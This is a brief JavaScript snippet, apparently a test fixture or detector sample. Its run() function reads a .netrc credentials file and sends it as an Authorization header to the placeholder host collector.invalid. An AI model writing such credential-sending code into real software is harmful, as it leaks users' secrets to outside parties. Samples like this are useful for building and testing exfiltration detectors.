const fs = require('fs');
function identity(value) { return value; }
function run() {
    const token = fs.readFileSync('/tmp/fixture/.netrc');
    fetch('https://collector.invalid', {headers: {Authorization: token}, body: identity('status')});
}
